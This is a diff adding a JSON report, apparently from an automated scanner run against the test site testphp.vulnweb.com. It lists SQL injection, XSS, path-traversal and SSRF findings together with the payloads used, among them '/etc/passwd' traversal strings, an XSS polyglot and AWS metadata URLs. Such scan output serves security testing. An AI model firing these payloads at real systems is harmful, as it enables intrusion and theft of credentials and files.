@@ -1,0 +1,1110 @@
+{
+  "info": {
+    "version": "0.1",
+    "timestamp": "2026-02-13T15:31:46.904328+00:00",
+    "targets": [
+      "http://testphp.vulnweb.com/"
+    ]
+  },
+  "vulnerabilities": [
+    {
+      "template_id": "fuzz-param-sqli",
+      "name": "SQL Injection - Parameter Fuzzing",
+      "severity": "medium",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {}
+        }
+      ]
+    },
+    {
+      "template_id": "fuzz-param-xss",
+      "name": "XSS - Parameter Fuzzing",
+      "severity": "medium",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist='xsshere",
+          "status_code": 200,
+          "payload": "'xsshere",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist='xsshere",
+          "status_code": 200,
+          "payload": "'xsshere",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat='xsshere",
+          "status_code": 200,
+          "payload": "'xsshere",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic='xsshere",
+          "status_code": 200,
+          "payload": "'xsshere",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=<xsshere>",
+          "status_code": 200,
+          "payload": "<xsshere>",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=<xsshere>",
+          "status_code": 200,
+          "payload": "<xsshere>",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=<xsshere>",
+          "status_code": 200,
+          "payload": "<xsshere>",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=<xsshere>",
+          "status_code": 200,
+          "payload": "<xsshere>",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=<xsshere>",
+          "status_code": 200,
+          "payload": "<xsshere>",
+          "extracted": {}
+        }
+      ]
+    },
+    {
+      "template_id": "errors-and-vulns",
+      "name": "Error Messages and Vulnerability Indicators",
+      "severity": "medium",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=%",
+          "status_code": 200,
+          "payload": "%",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=%",
+          "status_code": 200,
+          "payload": "%",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=%",
+          "status_code": 200,
+          "payload": "%",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=%",
+          "status_code": 200,
+          "payload": "%",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=%00",
+          "status_code": 200,
+          "payload": "%00",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=%00",
+          "status_code": 200,
+          "payload": "%00",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=%00",
+          "status_code": 200,
+          "payload": "%00",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=%00",
+          "status_code": 200,
+          "payload": "%00",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=select 1--xss<xssHere>aaa",
+          "status_code": 200,
+          "payload": "select 1--xss<xssHere>aaa",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=select 1--xss<xssHere>aaa",
+          "status_code": 200,
+          "payload": "select 1--xss<xssHere>aaa",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=select 1--xss<xssHere>aaa",
+          "status_code": 200,
+          "payload": "select 1--xss<xssHere>aaa",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=select 1--xss<xssHere>aaa",
+          "status_code": 200,
+          "payload": "select 1--xss<xssHere>aaa",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=select 1--xss<xssHere>aaa",
+          "status_code": 200,
+          "payload": "select 1--xss<xssHere>aaa",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=../../../../../../../../../etc/passwd",
+          "status_code": 200,
+          "payload": "../../../../../../../../../etc/passwd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=../../../../../../../../../etc/passwd",
+          "status_code": 200,
+          "payload": "../../../../../../../../../etc/passwd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../etc/passwd",
+          "status_code": 200,
+          "payload": "../../../../../../../../../etc/passwd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=../../../../../../../../../etc/passwd",
+          "status_code": 200,
+          "payload": "../../../../../../../../../etc/passwd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "status_code": 200,
+          "payload": ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "status_code": 200,
+          "payload": ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "status_code": 200,
+          "payload": ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "status_code": 200,
+          "payload": ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=..%252F..%252F..%252F..%252Fetc%252fpasswd",
+          "status_code": 200,
+          "payload": "..%252F..%252F..%252F..%252Fetc%252fpasswd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=..%252F..%252F..%252F..%252Fetc%252fpasswd",
+          "status_code": 200,
+          "payload": "..%252F..%252F..%252F..%252Fetc%252fpasswd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=..%252F..%252F..%252F..%252Fetc%252fpasswd",
+          "status_code": 200,
+          "payload": "..%252F..%252F..%252F..%252Fetc%252fpasswd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=..%252F..%252F..%252F..%252Fetc%252fpasswd",
+          "status_code": 200,
+          "payload": "..%252F..%252F..%252F..%252Fetc%252fpasswd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "status_code": 200,
+          "payload": "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "status_code": 200,
+          "payload": "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "status_code": 200,
+          "payload": "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "status_code": 200,
+          "payload": "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "extracted": {
+            "error_detail": [
+              "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server versi"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "template_id": "sqli-error-based",
+      "name": "SQL Injection - Error Based Detection",
+      "severity": "high",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic='",
+          "status_code": 200,
+          "payload": "'",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=\"",
+          "status_code": 200,
+          "payload": "\"",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`' at line 1"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=`",
+          "status_code": 200,
+          "payload": "`",
+          "extracted": {
+            "error_message": [
+              "SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`' at line 1"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "template_id": "fuzz-param-ssrf",
+      "name": "SSRF - Parameter Fuzzing",
+      "severity": "medium",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {}
+        }
+      ]
+    },
+    {
+      "template_id": "xss-polyglot",
+      "name": "XSS Polyglot Payload Detection",
+      "severity": "high",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "status_code": 200,
+          "payload": "JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "status_code": 200,
+          "payload": "JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "status_code": 200,
+          "payload": "JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "status_code": 200,
+          "payload": "JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "status_code": 200,
+          "payload": "JavaScript://%250Aalert?.(1)//'/*\\'/*\\/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->",
+          "extracted": {}
+        }
+      ]
+    },
+    {
+      "template_id": "xss-reflected",
+      "name": "Reflected XSS - Tag Injection Detection",
+      "severity": "high",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=abc<xsshere>abc",
+          "status_code": 200,
+          "payload": "abc<xsshere>abc",
+          "extracted": {}
+        }
+      ]
+    },
+    {
+      "template_id": "xss-dom-based",
+      "name": "DOM Based XSS Detection",
+      "severity": "high",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=javascript:(prompt)(1)",
+          "status_code": 200,
+          "payload": "javascript:(prompt)(1)",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp='(prompt)(1)-'",
+          "status_code": 200,
+          "payload": "'(prompt)(1)-'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=\"-(prompt)(1)-\"",
+          "status_code": 200,
+          "payload": "\"-(prompt)(1)-\"",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp='}(prompt)(1);{'",
+          "status_code": 200,
+          "payload": "'}(prompt)(1);{'",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=\"}(prompt)(1)%0A{\"",
+          "status_code": 200,
+          "payload": "\"}(prompt)(1)%0A{\"",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=(prompt)(1)//",
+          "status_code": 200,
+          "payload": "(prompt)(1)//",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=';-(prompt)(1)//",
+          "status_code": 200,
+          "payload": "';-(prompt)(1)//",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=\"';-(prompt)(1)//",
+          "status_code": 200,
+          "payload": "\"';-(prompt)(1)//",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=\";-(prompt)(1)//",
+          "status_code": 200,
+          "payload": "\";-(prompt)(1)//",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=*/;(prompt)(1);/*",
+          "status_code": 200,
+          "payload": "*/;(prompt)(1);/*",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp='autofocus/onfocus=(prompt)(1)//",
+          "status_code": 200,
+          "payload": "'autofocus/onfocus=(prompt)(1)//",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=\"autofocus/onfocus=(prompt)(1)//",
+          "status_code": 200,
+          "payload": "\"autofocus/onfocus=(prompt)(1)//",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=</script><svg/onload=(prompt)()>",
+          "status_code": 200,
+          "payload": "</script><svg/onload=(prompt)()>",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=<img src=1 onerror=(prompt)(1)>",
+          "status_code": 200,
+          "payload": "<img src=1 onerror=(prompt)(1)>",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=/\"><svg/onload=(prompt)(1)>",
+          "status_code": 200,
+          "payload": "/\"><svg/onload=(prompt)(1)>",
+          "extracted": {}
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
+          "status_code": 200,
+          "payload": "<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
+          "extracted": {}
+        }
+      ]
+    },
+    {
+      "template_id": "ssrf-detection",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "severity": "high",
+      "matches": [
+        {
+          "url": "http://testphp.vulnweb.com/artists.php?artist=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {
+            "aws_metadata": [
+              "ami-id",
+              "i-id"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/hpp/?pp=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {
+            "aws_metadata": [
+              "ami-id",
+              "ami-id",
+              "ami-id",
+              "i-id",
+              "i-id",
+              "i-id"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?artist=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {
+            "aws_metadata": [
+              "ami-id",
+              "i-id"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/listproducts.php?cat=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {
+            "aws_metadata": [
+              "ami-id",
+              "i-id"
+            ]
+          }
+        },
+        {
+          "url": "http://testphp.vulnweb.com/product.php?pic=http://169.254.169.254/latest/meta-data/ami-id",
+          "status_code": 200,
+          "payload": "http://169.254.169.254/latest/meta-data/ami-id",
+          "extracted": {
+            "aws_metadata": [
+              "ami-id",
+              "i-id"
+            ]
+          }
+        }
+      ]
+    },
+    {
